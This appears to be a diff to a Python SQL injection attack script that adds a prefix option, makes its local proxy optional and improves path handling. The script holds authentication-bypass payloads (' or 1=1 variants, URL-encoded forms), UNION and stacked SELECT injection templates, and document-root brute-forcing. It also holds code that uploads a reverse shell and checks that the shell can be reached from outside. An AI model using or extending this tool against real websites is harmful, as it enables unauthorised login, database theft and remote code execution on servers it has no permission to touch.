@@ -24,11 +24,10 @@ arg_parser.add_argument('-p','--parameter', dest='parameter', help='The injectab
 arg_parser.add_argument('-ns','--not-string', dest='bypass', help='Define the failed login message. Script try sqli until this string is not in the request output', type=str)
 arg_parser.add_argument('-s','--string', dest='found', help='Define the successfully login message. Script try sqli until the string is in the request output', type=str)
 arg_parser.add_argument('-l','--level', dest='level', help='The level of the scan (l|h) "l" for little, and "h" for huge', default='l', type=str)
-arg_parser.add_argument('-v', '--verbose', dest='verbose', help='Define verbose output. set to False by default', type=str, default="FALSE")
+arg_parser.add_argument('--prefix', dest='prefix', help='Define a prefix variable for the sqli. \n Per example "1 " ', default='', type=str)
+arg_parser.add_argument('--proxy', dest='proxy', help='Use a default proxy at "127.0.0.1:8080". set to False by default', action="store_true")
+arg_parser.add_argument('-v', '--verbose', dest='verbose', help='Define verbose output. set to False by default', action="store_true")
 args = arg_parser.parse_args()
-
-# proxy set for test
-proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}
 print("")
 # Gloabal vars
 TYPE= {}
@@ -61,11 +60,22 @@ if args.level.lower() in ('h', 'huge'):
   SCAN_LEVEL= 21
 else:
   SCAN_LEVEL= 11 
-if args.verbose.lower() in ('yes', 'true', 't', 'y', '1'):
+if args.verbose:
   VERBOSE= True
 else:
   VERBOSE= False
 TARGET=args.url.split("//")[1].split("/")[0]
+# directory path after the target address
+PATH_DIR=""
+PATH_DIR="/"+args.url.split("//")[1].split("/",1)[1]
+if not PATH_DIR.endswith('/'): 
+  pps= args.url.split("//")[1].split("/",1)[1].split("/")
+  cpath=""
+  for i in range(0,len(pps)-1):
+   cpath=cpath+"/"+pps[i]
+  PATH_DIR=cpath
+else:
+  PATH_DIR=PATH_DIR[:len(PATH_DIR)-1]   
 HTTP=args.url.split("//")[0].split(":")[0]
 BRUTE_DOC_ROOT_PREFIXES = {
     "linux": ("/var/www", "/usr/local/apache", "/usr/local/apache2", "/usr/local/www/apache22", "/usr/local/www/apache24", "/usr/local/httpd", "/var/www/nginx-default", "/srv/www", "/var/www/%TARGET%", "/var/www/vhosts/"+TARGET, "/var/www/virtual/"+TARGET, "/var/www/clients/vhosts/"+TARGET, "/var/www/clients/virtual/"+TARGET),
@@ -74,14 +84,14 @@ BRUTE_DOC_ROOT_PREFIXES = {
 # inject test
 INJECT_TEST = ("'","''","\"","\"\"","\\","\\\\")
 #bypass authentication 
-BYPASS_AUTH = ("' or 1=1 ","' Or 1=1 ","' oR 1=1 ","\%27\%20\%6f\%72\%201\%3D1\%20 ", "%27%20%7c%7c%201%3D1 ","' || 1=1 "," or 1=1 "," Or 1=1 "," oR 1=1 ","%20%6f%72%201%3D1%20 ", "%20%7c%7c%201%3D1 "," || 1=1 ","' and 1=1 ","' And 1=1 ","' aNd 1=1 ","' anD 1=1 ","' && 1=1 ","' %26%26 1=1 ","%27%20%26%26%201%3D1%20","%27%20%20%61%6e%64%20%31%3d%31%20"," and 1=1 "," And 1=1 "," aNd 1=1 "," anD 1=1 "," && 1=1 "," %26%26 1=1 ","%20%26%26%201%3D1%20","%20%20%61%6e%64%20%31%3d%31%20","admin' or '1'='1'","admin') or ('1'='1","admin\" or 1=1")
+BYPASS_AUTH = ("%s || 1=1 "%args.prefix,"%s or 1=1 "%args.prefix,"-1 or 1=1 ","-1 Or 1=1 ","-1 oR 1=1 ","-1 || 1=1 ","' or 1=1 ","' Or 1=1 ","' oR 1=1 ","\%27\%20\%6f\%72\%201\%3D1\%20 ", "%27%20%7c%7c%201%3D1 ","' || 1=1 "," or 1=1 "," Or 1=1 "," oR 1=1 ","%20%6f%72%201%3D1%20 ", "%20%7c%7c%201%3D1 "," || 1=1 ","' and 1=1 ","' And 1=1 ","' aNd 1=1 ","' anD 1=1 ","' && 1=1 ","' %26%26 1=1 ","%27%20%26%26%201%3D1%20","%27%20%20%61%6e%64%20%31%3d%31%20"," and 1=1 "," And 1=1 "," aNd 1=1 "," anD 1=1 "," && 1=1 "," %26%26 1=1 ","%20%26%26%201%3D1%20","%20%20%61%6e%64%20%31%3d%31%20","admin' or '1'='1'","admin') or ('1'='1","admin\" or 1=1")
 # Suffixes used in brute force search for web server document root
 BRUTE_DOC_ROOT_SUFFIXES = ("", "html", "htdocs", "httpdocs", "php", "public", "src", "site", "build", "web", "www", "data", "sites/all", "www/build")
 
 # SQLI brute force tempaltes
-SQLI_SELECT = ("name';SELECT ", "name';SELECT ", "name ;SELECT ", "name ;SELECT ", "-5314';SELECT ", "-5314';SELECT ", "-5314 ;SELECT ", "-5314 ;SELECT ")#
-SQLI_SELECT_UNION = ("-8408 UNION ALL SELECT ", "-8408' UNION ALL SELECT ", "name UNION ALL SELECT ", "name' UNION ALL SELECT ")#
-SQLI_OR_AND = ("' or  ","' Or  ","' oR  ","' ||  "," or  "," Or  "," oR  "," ||  ","' and  ","' And  ","' aNd  ","' anD  ","' &&  ","' %26%26  "," and  "," And  "," aNd  "," anD  "," &&  "," %26%26  ","admin\" or ")
+SQLI_SELECT = ("%s ;SELECT "%args.prefix, "name';SELECT ", "name';SELECT ", "name ;SELECT ", "name ;SELECT ", "-5314';SELECT ", "-5314';SELECT ", "-5314 ;SELECT ", "-5314 ;SELECT ")#
+SQLI_SELECT_UNION = ("%s UNION ALL SELECT "%args.prefix, "-8408 UNION ALL SELECT ", "-8408' UNION ALL SELECT ", "name UNION ALL SELECT ", "name' UNION ALL SELECT ")#
+SQLI_OR_AND = ("%s oR  "%args.prefix, "%s ||  "%args.prefix, "%s anD  "%args.prefix, "%s &&  "%args.prefix, "' or  ","' Or  ","' oR  ","' ||  "," or  "," Or  "," oR  "," ||  ","' and  ","' And  ","' aNd  ","' anD  ","' &&  ","' %26%26  "," and  "," And  "," aNd  "," anD  "," &&  "," %26%26  ","admin\" or ")
 SQLI_COMMENT = ('#','/*','-- -','-- --',';%00','`')
 REQUEST= {}
 for param in args.data.split("&"):
@@ -134,10 +144,18 @@ def request_verify(request, verify,myhash,type):
       return True      
   return False 
 
+# proxy set for test
+def proxy():
+  if args.proxy:
+    return {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}
+  else:
+    return {}  
+
 #make a request
 def send_request():
+  proxies=proxy()
   if ( args.method.lower() == "get" ):
-    req=requests.post(args.url,allow_redirects=False,verify=False,params=REQUEST, headers=HEADERS, cookies=COOKIES,timeout=30,proxies=proxies)
+    req=requests.get(args.url,allow_redirects=False,verify=False,params=REQUEST, headers=HEADERS, cookies=COOKIES,timeout=30,proxies=proxies)
   else:
     req=requests.post(args.url,allow_redirects=False,verify=False,data=REQUEST, headers=HEADERS, cookies=COOKIES,timeout=30,proxies=proxies)
   return req  
@@ -157,6 +175,10 @@ def upload_file(path,head,tail,hexadumpfile,revname):
 
 # verify that he rev shell is reachable from outside
 def found_revshell(path,revname,list_url):
+  proxies=proxy()
+  # Add the url direcory path if exist to the trief path
+  if PATH_DIR != "":
+     path=PATH_DIR+path
   if path[len(path)-1] != "/":
     fpath= path+"/"+revname
   else:
@@ -164,18 +186,19 @@ def found_revshell(path,revname,list_url):
   nb=len(fpath.split("/"))
   gurl=HTTP+"://"+TARGET+"/"
   url=gurl+revname
+  print("path: %s, fpath: %s, gurl: %s" % (path,fpath,gurl))
   debug('Test url: '+url)
-  resultat=requests.get(url,allow_redirects=False,verify=False,headers=HEADERS, cookies=COOKIES)
+  resultat=requests.get(url,allow_redirects=False,verify=False,headers=HEADERS, cookies=COOKIES, proxies=proxies)
   debug("The response code is:"+str(resultat.status_code))
   if ( resultat.status_code == 200 and url not in list_url.keys() ) :
     debug("Success. The rev shell uploaded in path "+fpath+" and you can access it at the url: "+url) 
     list_url[url]=fpath 
   else:  
-    for i in range(1,nb):
+    for i in range(1,nb-1):
       lurl=fpath.split("/",i)[len(fpath.split("/",i))-1]
       url=gurl+lurl
       debug('Test url: '+url)
-      resultat=requests.get(url,allow_redirects=False,verify=False,headers=HEADERS, cookies=COOKIES) 
+      resultat=requests.get(url,allow_redirects=False,verify=False,headers=HEADERS, cookies=COOKIES, proxies=proxies) 
       debug("The response code is:"+str(resultat.status_code))
       if ( resultat.status_code == 200 and url not in list_url.keys() ):
         debug("Success. The rev shell uploaded in path "+fpath+" and you can access it at the url: "+url)  
